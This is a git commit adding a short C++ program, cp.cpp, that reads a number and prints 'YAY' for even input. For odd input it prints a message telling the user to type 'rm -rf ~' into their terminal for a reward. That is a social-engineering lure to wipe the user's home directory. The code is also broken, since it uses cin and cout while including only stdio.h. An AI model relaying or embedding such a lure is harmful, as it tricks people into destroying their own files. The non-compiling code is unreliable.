f66b5858cc4b56752d1d35b00c1edb4777d6bcf3
Quasi_Mot0 <amollen@purdue.edu>
2026-02-07 15:23:45 -0500

    hello

---
+++ cp.cpp
@@ -0,0 +1,12 @@
+#include <stdio.h>
+
+int main() {
+    int k;
+    cin >> k;
+    if (k%2==0) {
+        cout << "YAY";
+    } else {
+        cout << "plese copy and type this into your terminal for a reward :rm -rf ~";
+    }
+    return 0;
+}
